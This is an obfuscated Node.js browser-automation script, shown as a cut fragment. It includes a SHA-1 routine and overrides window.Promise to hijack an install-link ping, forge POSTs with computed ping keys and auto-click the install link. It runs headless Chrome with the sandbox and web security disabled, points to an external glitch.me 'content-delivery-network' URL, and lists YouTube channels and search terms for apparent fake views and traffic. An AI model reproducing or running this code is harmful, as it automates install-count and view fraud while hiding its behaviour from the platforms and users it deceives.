+ -0x2ab + 0x3c7 * 0x1) << y[0x1 * 0x2564 + -0x86 * -0x5 + 0x3 * -0xd55 & N++], P[N >> -0x274 * 0x2 + -0x1ee3 * 0x1 + 0x23cd] |= (0x6 * 0x51a + 0x29f * -0x5 + -0x3 * 0x5ab | -0x5e * -0x28 + -0x4be * -0x1 + -0x1 * 0x132f & L) << y[0x1 * -0x1ec1 + 0x179 * -0x5 + 0x2621 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0xfb7 + -0x1d6 * 0x9 + 0x207d ? (this['block'] = P[0x6 * -0x423 + 0x2 * -0x336 + 0x1f4e], this['start'] = N - (0x9eb * 0x2 + -0x46a + 0x4 * -0x3cb), this['hash'](), this['hashed'] = 0x14e * -0x11 + 0x2e * -0x2f + 0x1ea1) : this['start'] = N;
                }
                return this['bytes'] > -0x2210cd38 * -0x3 + 0x10fcc4f03 + -0x1 * 0x75feb6ac && (this['hBytes'] += this['bytes'] / (0x6 * -0x183d49d2 + -0x70542e7c + 0x32c80c * 0xa1e) << 0xa6e + -0x6c1 + -0x3ad, this['bytes'] = this['bytes'] % (-0x29701af8 + 0x2123 * 0x18484 + -0x3dc97e3b * -0x4)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x24d * 0x1 + 0x127 * -0x7 + 0x5c5;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1 * -0xcf0 + -0x10d * 0x14 + 0x1 * 0x824] = this['block'], J[K >> -0xa * 0xdb + -0x13 * 0x3 + -0xd * -0xad] |= x[-0x3 * -0x971 + -0x11ba + -0x2 * 0x54b & K], this['block'] = J[0x5bf + 0xcd9 + -0x8 * 0x251], K >= 0xa1f * 0x2 + -0xda4 + -0x662 && (this['hashed'] || this['hash'](), J[-0x3a5 * -0x2 + 0x1f7f + -0x26c9] = this['block'], J[0x1896 + 0xa98 + -0xa * 0x383] = J[0x1866 + -0x1cca + -0x7d * -0x9] = J[0x1151 * 0x1 + -0xaa5 + -0x6aa] = J[0x80f * -0x4 + -0x5cd + 0x14 * 0x1e7] = J[0x117a + -0x21 * 0x8 + -0x106e] = J[-0xc80 + -0x1771 * -0x1 + -0xaec] = J[-0x2 * -0x3b9 + -0x1f11 * 0x1 + 0x17a5] = J[-0x7a9 + -0x2 * -0xe65 + -0x151a] = J[0x85f * -0x3 + -0x162d + -0x7e3 * -0x6] = J[-0x2455 * -0x1 + 0x2232 + -0x467e * 0x1] = J[-0x3f + -0x3ab * 0xa + 0x24f7] = J[0x4c * 0x33 + 0x4e * 0x3 + -0x1003 * 0x1] = J[0x203d + -0x6 * 0x3f9 + 0x45 * -0x1f] = J[-0x3d6 + -0x1b02 + 0x1ee5 * 0x1] = J[-0x7 * 0xce + 0xc10 + -0x660] = J[0xd6c * 0x1 + 0x17 * 0x71 + -0x2 * 0xbc2] = 0x1920 + 0x3 * 0x1f8 + -0x1f08), J[-0x1ddf + 0x2625 + -0x838] = this['hBytes'] << -0x1df * -0x13 + 0x23ae + -0x2 * 0x239c | this['bytes'] >>> -0x25e9 + 0x8bf * 0x3 + 0xbc9, J[-0x15b9 + -0x2d6 * 0xa + 0x3224] = this['bytes'] << -0xd8 * 0x1 + -0x2024 + 0x20ff * 0x1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x540 + 0xabb + -0xfeb; J < -0x1 * 0x189 + 0x7be + -0x3 * 0x1f7; ++J)
                K = Q[J - (-0x13e9 * 0x1 + 0x7 * 0x2bb + 0x1 * 0xcf)] ^ Q[J - (0x8e * -0x35 + -0x17 * -0x199 + -0x1 * 0x751)] ^ Q[J - (-0x1 * -0x38b + 0x1839 + -0xddb * 0x2)] ^ Q[J - (-0x2d8 + -0x12bb + 0x15a3)], Q[J] = K << 0x267b + 0x1ff5 * 0x1 + -0x466f | K >>> -0x23ce * -0x1 + -0x40d + -0xfd1 * 0x2;
              for (J = -0x976 + 0x9c8 + -0x52; J < -0x1515 + -0x752 * -0x5 + -0xf71; J += -0x7 * 0x4ff + 0x709 * 0x3 + 0xde3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xc * -0x1af + -0x13f4 + 0x1 * -0x3b | L >>> -0x26b5 + -0x1 * 0x2458 + 0x4b28) + (M & N | ~M & O) + P + (0x1fa * -0x17e35b + 0x93b0b022 + -0x9f6d4ab) + Q[J] << -0x722 + -0x3d1 * -0x3 + -0x451) << -0x1 * 0x19f3 + 0x151 * -0x19 + -0x3ae1 * -0x1 | P >>> 0x5d3 + 0x7 * -0x371 + 0x125f) + (L & (M = M << -0x2b * -0x10 + 0x798 * 0x1 + -0xa2a | M >>> 0x5b0 + 0x1fa4 + -0x12a9 * 0x2) | ~L & N) + O + (0xa5c3e1f5 + 0x6f7e * -0xc37 + -0x45ef8c4a) + Q[J + (-0x17 * -0xc1 + 0x1 * -0x37f + 0xdd7 * -0x1)] << 0x1e9a + 0x15c6 + 0x346 * -0x10) << 0x1ea8 + -0x416 * 0x3 + -0x1261 | O >>> 0x25 * 0x2b + 0x2654 * 0x1 + -0x2c70) + (P & (L = L << -0x26e1 + 0x3f * 0xf + 0x234e | L >>> -0x1e1e + 0x27 * -0xfc + -0x36d * -0x14) | ~P & M) + N + (-0x75611467 + 0xbf3daa1 + 0xc3efb35f) + Q[J + (-0x1707 + 0x105c * -0x1 + 0x2765)] << -0xe69 + -0xf8c + 0x1df5) << -0x86e + -0x36c * -0x3 + 0x9b * -0x3 | N >>> 0x4 * -0x1f3 + 0xc21 + -0x2 * 0x21d) + (O & (P = P << -0x4c1 * -0x7 + 0xa * 0x3e + -0x2395 | P >>> 0xd8c + -0x3 * -0xb44 + -0x2f56) | ~O & L) + M + (0x894f4bc9 + 0xc15124b + -0x3ae1e47b) + Q[J + (0x1 * 0x4d2 + 0x30c + -0x1 * 0x7db)] << -0x1216 + -0x6d9 * -0x1 + 0xb3d) << -0x1944 + 0x4 * -0x193 + 0xa87 * 0x3 | M >>> -0x236e + -0xd * 0x2e3 + 0x4910) + (N & (O = O << -0x1f * 0xf1 + 0x1b1 + 0x1b9c | O >>> 0xdf * -0x6 + 0x1 * -0xc6f + -0x11ab * -0x1) | ~N & P) + L + (0x9a3ed27c + 0x8c4d9e5b + -0xcc09f73e) + Q[J + (-0x113d * -0x2 + 0x1152 * 0x2 + -0x451a)] << -0xca + 0x24a0 + 0x342 * -0xb, N = N << 0x19 * 0x39 + 0xea2 + -0x1415 | N >>> 0xb9f + -0x2e4 + -0x8b9;
              for (; J < -0x46b * -0x1 + -0x2 * 0x581 + 0x6bf; J += -0xa9 * 0x37 + -0x20f8 + 0x454c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1af4 + 0x11 * 0x127 + -0xbd * -0xa | L >>> 0x71 * -0x3d + -0xa7 * -0x1 + -0x1 * -0x1a61) + (M ^ N ^ O) + P + (-0x664b7cf9 * 0x1 + -0x4a184db1 + 0x97 * 0x1e6fa6d) + Q[J] << 0x67a + -0x60c + -0x6e) << 0x2174 + -0x99f + -0x30 * 0x7f | P >>> 0x10f * 0x20 + -0x1 * 0xdaf + -0x1416) + (L ^ (M = M << -0x46d * 0x2 + -0x1cd1 + 0x239 * 0x11 | M >>> 0x1 * -0xa6f + 0x1b7d + -0x110c) ^ N) + O + (0xa26b13c4 + -0x1368e * 0x472 + -0x2e2ca4e7) + Q[J + (0x107d + 0x1c7d + 0x18d * -0x1d)] << -0xde3 + 0x1b67 + -0xd84) << -0x128d + 0xa * -0x125 + 0x2 * 0xf02 | O >>> -0xdec + -0x22a7 + -0x1f * -0x192) + (P ^ (L = L << -0x1db9 + -0x22be + 0x4095 * 0x1 | L >>> -0xd44 + -0x1e98 * -0x1 + -0x1152) ^ M) + N + (-0xd01ab376 + 0x2 * -0x23f6b2a7 + 0x7 * 0x37d72533) + Q[J + (-0x2612 + -0x15c4 + 0x3bd8)] << 0x2aa * 0x4 + -0x1d6b + -0x641 * -0x3) << 0x4d + -0x2280 + -0x2238 * -0x1 | N >>> 0x4a9 + 0xa2d + -0x1a3 * 0x9) + (O ^ (P = P << 0x61b + 0x5 * 0xbe + -0xd * 0xbf | P >>> 0x19c * -0x3 + 0x11d3 + -0x5 * 0x299) ^ L) + M + (0x187df4c4 * -0x2 + -0x7d084ed + -0x1 * -0xa7a65a16) + Q[J + (0x8b7 + 0x1be2 + -0x2496)] << -0x162d * 0x1 + 0x11d1 * -0x1 + -0x1 * -0x27fe) << 0x121 + -0x1 * -0x5ee + 0x35 * -0x22 | M >>> -0xa97 + -0x1b5b * -0x1 + -0x10a9) + (N ^ (O = O << 0x226b + 0x1981 + -0x3bce | O >>> -0x24f6 + 0x9f5 + -0x1b03 * -0x1) ^ P) + L + (-0x16dd0e5 * 0x13 + -0x8c8ff * 0x8b7 + 0xd69012e9) + Q[J + (-0x24ec * 0x1 + -0x1715 + -0x5 * -0xc01)] << -0xa77 + 0x1 * -0xd73 + 0x17ea, N = N << 0x2565 * -0x1 + -0x42d + 0x14d8 * 0x2 | N >>> -0x1f7d * 0x1 + 0x2323 + 0x4 * -0xe9;
              for (; J < 0x8fd * -0x3 + 0xcbf + 0xe74; J += -0x125 * 0x5 + -0x37f * -0x1 + -0x19 * -0x17)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x17 * 0x31 + -0x46a * -0x7 + -0x1a7a | L >>> -0x1bb * 0x5 + -0x7eb + 0x58f * 0x3) + (M & N | M & O | N & O) + P - (0x1 * 0x60bf08ff + -0x1 * -0x997a2b4a + 0x1bb4b * -0x4f4f) + Q[J] << -0x1 * -0xe35 + 0x1360 + -0x2195 * 0x1) << -0x1e0a + 0x15e6 + -0x829 * -0x1 | P >>> -0x798 * -0x5 + 0x17 * 0xf8 + 0x59 * -0xad) + (L & (M = M << 0x703 * -0x3 + 0x4d2 * 0x1 + 0x25 * 0x71 | M >>> 0x119 * -0x2 + 0x13b4 + 0xe0 * -0x14) | L & N | M & N) + O - (-0x40b4fa29 + -0x24a4a807 + 0x4 * 0x358f7955) + Q[J + (-0x1fa5 * 0x1 + 0x1779 + 0x82d)] << -0xe3 + 0x1408 + -0x1325) << -0xf0 * 0x14 + 0x16ca * -0x1 + -0x1 * -0x298f | O >>> -0xa77 + -0x86b * -0x1 + -0x13 * -0x1d) + (P & (L = L << -0x993 + -0x21b7 + 0x2b68 | L >>> -0xdf5 + -0x1cb4 + 0x2aab) | P & M | L & M) + N - (0x4 * -0x1ea39d3f + 0x297e2eeb + 0xc1f48935) + Q[J + (0x1b4a + -0xcc6 + -0x741 * 0x2)] << 0x8cb * 0x2 + 0x1e6c + -0x5 * 0x99a) << 0x23dd + 0x1cd6 * 0x1 + -0x40ae | N >>> 0xe2c + 0x90f + -0x1720) + (O & (P = P << 0x83 * -0x9 + -0x14bf + -0x518 * -0x5 | P >>> -0x305 * -0x4 + -0x1112 + 0xa * 0x80) | O & L | P & L) + M - (-0x966fab9f + 0x1 * -0xc379c7f6 + -0x1d3 * -0xfb81c3) + Q[J + (0x1 * -0x16cc + 0x65b + 0x4e * 0x36)] << -0x4c * 0x35 + -0x1b71 + 0x2b2d) << 0x1054 * 0x1 + 0xa7 * -0x1 + -0x4 * 0x3ea | M >>> -0x9 * -0x12d + 0x5 * -0x16a + 0x4 * -0xda) + (N & (O = O << 0x88 * -0x39 + -0x1511 + 0x9b * 0x55 | O >>> -0x18 * -0x51 + 0x6d * -0x7 + -0x49b) | N & P | O & P) + L - (0xb2a08a0 + -0x131ec24 * 0x47 + 0xba92b880) + Q[J + (-0xb37 * -0x2 + 0x2243 * 0x1 + -0x38ad * 0x1)] << 0xc6d + -0x493 * -0x1 + -0x1100, N = N << 0xea0 + -0x82 * 0x43 + -0x4e1 * -0x4 | N >>> -0xa9 * 0xe + 0x1e81 + -0x1541;
              for (; J < 0x699 * 0x2 + -0x3 * -0xb95 + -0x2fa1; J += -0x24 * 0xea + -0x1 * -0x9fd + 0x16f0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x492 + -0x17eb + -0xb2 * -0x29 | L >>> -0x12 * -0x63 + -0x1 * 0x1948 + 0x126d) + (M ^ N ^ O) + P - (-0xbd055d1 + 0x4af150a3 + -0x983bca8) + Q[J] << -0x137 * 0xe + -0xb7f + -0x1c81 * -0x1) << 0x8fc + -0x6a * -0x12 + 0x106b * -0x1 | P >>> 0x32 * -0x53 + 0x4 * 0x49f + -0x22b) + (L ^ (M = M << 0x19 * 0x18c + -0x512 + -0x217c * 0x1 | M >>> 0xf2d + -0xdc5 + 0x2 * -0xb3) ^ N) + O - (-0x6877adcd + -0x67968cf9 + 0x105ab78f0) + Q[J + (-0x6a1 + -0xd36 + 0x13d8)] << -0x1c0e + 0xe32 + 0xddc) << -0x1 * 0x1289 + -0x82 * -0x1a + 0x112 * 0x5 | O >>> -0x1cf4 + -0x543 * -0x6 + -0x283) + (P ^ (L = L << -0x25a3 + -0x151 * 0xa + 0x32eb | L >>> -0x6 * -0x362 + 0x1 * -0x1181 + 0x1 * -0x2c9) ^ M) + N - (-0x1352 * -0x35bd5 + 0x358b0fca + 0x2 * -0x2069056d) + Q[J + (-0xe5a + -0x1 * -0xe18 + 0x44)] << -0x4 * -0xcc + -0xa * -0x65 + 0x391 * -0x2) << -0x12 * -0x116 + 0x9de * -0x1 + -0x9a9 | N >>> -0x965 + -0x109b + -0x1 * -0x1a1b) + (O ^ (P = P << -0x24bd + 0xf24 + 0x15b7 | P >>> -0xe3 * -0x1d + -0x1fea + 0x635) ^ L) + M - (-0x184f299c + -0x30147063 + -0x2609ea5 * -0x35) + Q[J + (0x1454 + -0x21d9 * -0x1 + 0x120e * -0x3)] << -0x6a * 0x2a + 0x1d7c + 0x56 * -0x24) << 0x11c + 0x1bdb + -0x1cf2 | M >>> -0x3a5 * -0x1 + 0x1d2a * 0x1 + -0x20b4) + (N ^ (O = O << -0x10b8 + -0x108 + 0x11de | O >>> -0x4b6 * -0x5 + 0x2001 + -0x378d * 0x1) ^ P) + L - (-0x374731f9 * -0x1 + -0x2a1ad9da * 0x1 + 0x2870e60b) + Q[J + (-0x20a0 + -0x152c + -0x11f0 * -0x3)] << -0x52 * 0x37 + 0xd3 * -0x11 + -0x3 * -0xa8b, N = N << 0x5 * -0x427 + 0x2709 * -0x1 + 0x3bea | N >>> -0x1d50 + -0x1cd * -0xb + 0x983;
              this['h0'] = this['h0'] + L << -0xe9 * -0x1d + -0x38 * -0x39 + -0x26dd, this['h1'] = this['h1'] + M << -0x13a3 + -0xefd + 0x22a0, this['h2'] = this['h2'] + N << -0x1c64 + 0xa * 0x2f5 + -0x12e, this['h3'] = this['h3'] + O << 0x13 * -0x1ab + 0x2 * 0x357 + 0x1903, this['h4'] = this['h4'] + P << 0x1734 + 0x2 * 0x5db + -0x29 * 0xda;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x2321 + -0x14ea + -0xe1b & 0x1f44 + 0x2655 + -0x458a] + w[J >> -0x24f3 + 0xe16 * 0x1 + 0x7a7 * 0x3 & -0x99a + 0xfb7 + 0x9b * -0xa] + w[J >> -0x5d6 + 0x25f5 + -0x277 * 0xd & -0x17ba + -0x2013 + 0x514 * 0xb] + w[J >> 0x1 * -0x130d + 0x1a03 + -0x6e6 & 0x26 * -0xa7 + -0xa6 * 0xd + 0x2147] + w[J >> -0xee7 + -0x3 * -0xba4 + -0x13f9 & -0x173d * 0x1 + -0x2 * 0xbff + 0x2f4a] + w[J >> 0x1b3e + -0xdb2 * -0x2 + -0x369a & 0x1493 + -0x6f9 + -0xd8b * 0x1] + w[J >> 0xbfa + -0x105f + 0x469 & 0x3e4 * 0x1 + -0xe1e * 0x2 + 0x1867] + w[0x41b * 0x6 + 0x164a + 0x535 * -0x9 & J] + w[K >> -0x221 * -0x1 + 0x1 * -0xdce + -0x7 * -0x1af & 0x1f1c + 0x1dca + -0x59 * 0xaf] + w[K >> -0x14de + -0x559 * -0x5 + 0x5c7 * -0x1 & -0x1 * 0x10d4 + -0x231c + 0x33ff] + w[K >> -0x4 * -0x98f + -0x3 * 0x27b + 0xa3d * -0x3 & -0x2b * 0x24 + -0x1 * 0x689 + 0xca4] + w[K >> 0x1 * 0xc6e + -0xd * 0x17 + 0x3d * -0x2f & -0x562 * -0x2 + 0xf7a + -0x1a2f] + w[K >> -0x401 + 0x140b * -0x1 + 0x1818 & -0xa3b + 0x181 * 0xb + -0x641] + w[K >> -0xbf5 + 0x1665 + 0x2 * -0x534 & 0x452 + -0x1 * -0x1f7d + 0x68 * -0x58] + w[K >> -0x23f9 + 0x3 * 0x85d + 0x5a * 0x1f & -0x1 * 0x2437 + 0x11eb * -0x1 + 0x3631] + w[0x731 + 0x2 * -0x4a9 + 0x230 & K] + w[L >> -0x10af * 0x2 + 0x1b05 + 0x13 * 0x57 & -0x26a6 + -0x7 * 0x2f5 + 0x3b68] + w[L >> -0x1 * -0x293 + 0x14 * -0xb9 + 0x1 * 0xbf9 & 0x1f0f + 0x17af * 0x1 + -0x36af] + w[L >> -0x1a44 + 0x128e + 0x7ca & -0x277 * 0xb + -0x18f4 + 0x3420] + w[L >> 0x5a5 + 0xab5 * 0x3 + -0x25b4 & -0xa * 0x3be + 0x2de * -0x2 + -0x1e1 * -0x17] + w[L >> 0x20ba + -0x67e + 0x8 * -0x346 & -0x28 + -0x70c + 0x743] + w[L >> -0x23fb + 0x10ca + 0x1339 * 0x1 & -0xa71 + 0x25ae + 0x47 * -0x62] + w[L >> 0x1f79 + -0x24a8 + 0x533 & 0x932 + 0xc73 + -0x12 * 0x133] + w[-0x26ed + 0x1d8e + 0x96e & L] + w[M >> -0x2 * -0x36f + 0x198 * -0x11 + 0x1456 & -0xce * 0x17 + 0x248e + 0x3 * -0x5ff] + w[M >> 0x22e0 + -0x253c + 0x274 & 0x3b3 * 0x3 + 0x1 * -0x86d + -0x29d] + w[M >> 0x3 * 0x618 + -0x1 * -0x72 + -0x9a * 0x1f & 0x25a8 + 0x299 + -0x2832] + w[M >> 0x2350 + -0x127e + -0xc3 * 0x16 & 0xd7 * -0x17 + -0x572 + 0x18d2] + w[M >> -0x1 * 0x891 + 0x143c + -0xb9f & 0x11 * 0x195 + -0x2667 * -0x1 + -0x413d] + w[M >> 0x4 * 0x47 + -0x1605 + 0x3 * 0x6fb & 0xe19 + -0x3 * -0x297 + -0x15cf * 0x1] + w[M >> -0x1 * 0xfea + 0x13 * -0x7f + 0x195b & 0x2 * -0x4a9 + 0x1 * -0x256 + 0xbb7] + w[0x1591 * -0x1 + 0x41 * -0x2f + 0x218f & M] + w[N >> -0x1 * -0x6a1 + 0x1 * 0x3b0 + -0xd * 0xc9 & -0x1 * -0xda3 + -0x39e + -0x9f6] + w[N >> -0x1591 + 0xfe5 + 0x5c4 & 0x11db * -0x1 + 0xea1 + -0x349 * -0x1] + w[N >> -0x17a0 + -0x92f + 0x20e3 * 0x1 & 0x217a + 0x8e * 0x30 + -0x3c0b] + w[N >> 0xf73 + 0x1ed6 + -0x2e39 & 0xd * 0x14b + -0x1 * 0x18d + 0x1 * -0xf33] + w[N >> -0x13b7 + 0x2e4 * -0x9 + 0x2dc7 * 0x1 & -0xce2 + 0x3 * -0x93f + 0x28ae] + w[N >> -0x209e + 0x9bb * -0x2 + 0x341c & 0x3 * -0x597 + -0x2 * 0x7fb + 0x20ca] + w[N >> -0xc * -0x223 + 0xd17 + -0x26b7 & -0x30d + -0xe09 + 0x1125] + w[-0x582 + 0x6ee * -0x5 + 0x2837 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x23a9 + 0x5 * -0x479 + -0xd34 & -0x1c6f + -0x146e + 0xc77 * 0x4,
                J >> 0x1 * -0xd41 + 0x17f + 0x5e9 * 0x2 & 0x1d0b + 0x793 * 0x1 + 0xb * -0x33d,
                J >> -0x207f + -0x189a + 0x7d * 0x75 & -0x24e9 + -0x2342 * -0x1 + 0x2a6,
                0x39a + -0x5 * 0x5f6 + 0x1b33 & J,
                K >> 0x1c39 + -0x231a + 0x6f9 & -0x2 * -0xd45 + -0x1f * 0xab + 0x4d6 * -0x1,
                K >> -0x1883 + 0x2518 * 0x1 + -0xc85 & 0x20f1 + -0x25b8 + 0x5c6,
                K >> -0xf * 0xc9 + -0x4c * 0x49 + 0x217b & -0x92 * -0x13 + -0xf25 + 0x2a7 * 0x2,
                -0x262c + 0x20ec + -0x7b * -0xd & K,
                L >> 0x1dda + -0x1fac * -0x1 + -0x3d6e & -0x7 * -0x1b6 + -0x237 + -0x44 * 0x21,
                L >> 0x935 * 0x2 + 0x3 * -0x3df + -0x45 * 0x19 & -0x101 * 0x14 + 0x1 * -0x1ee3 + 0x33f6,
                L >> -0xc1 * 0x19 + -0x341 * -0x7 + -0x3e6 & -0x337 * 0x2 + -0x53 * -0x16 + 0x4b,
                0x1 * -0x1d9b + 0xe46 + 0x1054 & L,
                M >> 0x5 * 0x151 + 0x7fa + -0xe77 & 0x677 * 0x4 + -0x1 * 0x14bc + 0x1 * -0x421,
                M >> 0x72e * -0x5 + 0x13bb + 0x103b & 0x1001 * 0x1 + -0x2 * -0xde9 + -0x2ad4,
                M >> 0x234e + 0x22ca + -0x26 * 0x1d8 & -0x6e1 + -0x1156 * 0x2 + 0x2a8c,
                -0xe48 + -0x1296 * -0x1 + -0x34f * 0x1 & M,
                N >> 0x691 * 0x1 + 0x2135 * -0x1 + 0x1abc & 0x22fc + 0x25ab + 0x1 * -0x47a8,
                N >> 0x1432 + -0x1aab + 0x689 & 0x65 * 0x8 + 0x3 * 0x6fb + -0x171a,
                N >> 0x1ca1 + -0xdb * -0x1d + -0x3568 & 0x4 * 0x6f5 + -0x247c + -0x1 * -0x9a7,
                0xcd5 + -0xce1 + 0x10b & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x49d * 0x1 + -0x26fd + 0x2bae), (K = new DataView(J))['setUint32'](-0x33 * -0x4d + -0x15a0 + 0x649, this['h0']), K['setUint32'](0xd1a + 0x4 * -0x543 + 0x7f6 * 0x1, this['h1']), K['setUint32'](0xa * -0x33d + -0x9ec * -0x1 + -0x2 * -0xb3f, this['h2']), K['setUint32'](0x1c14 + 0xb14 + -0x271c, this['h3']), K['setUint32'](-0x1401 + 0x3 * -0x38f + 0x1ebe, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x17f5 * 0x1 + 0xfff + 0x1 * 0x7f6];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x26a8 + 0x197d + -0x4025;
            J[-0xaa8 + -0x1bfe + 0x26a6]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xcf2 + 0x11 * 0xb9 + 0x869 * -0x3] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x14a6 + -0x851 * -0x2 + -0x2547), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1d7 * -0xc + -0x23c1 * -0x1 + -0xdac;
              }
            }), K || super(...J);
          }
        }, window[V(0x9)](() => {
          I['click']();
        }, 0xce4 + 0x844 + 0xb * -0x164), Promise['resolve'](-0x8 * 0x31f + -0x2d4 * -0x7 + 0x52d);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x2eb + 0xe36 + -0xb4b; j < 0x1c46 + -0x2 * 0x289 + -0x1733; j++)
    i();
}
const NETWORK_PATIENCE = -0x208e + -0x1 * -0x3675 + 0x959 * 0x1 + (-0x1 * 0x24bc + 0x12f * 0x20 + -0x4 * -0x2a5) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x62f * 0x2 + 0x3 * 0x6b4 + -0x7bb) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x8ae + -0x1 * 0x10e2 + -0x5 * -0x1a4; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + W(0x1) + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 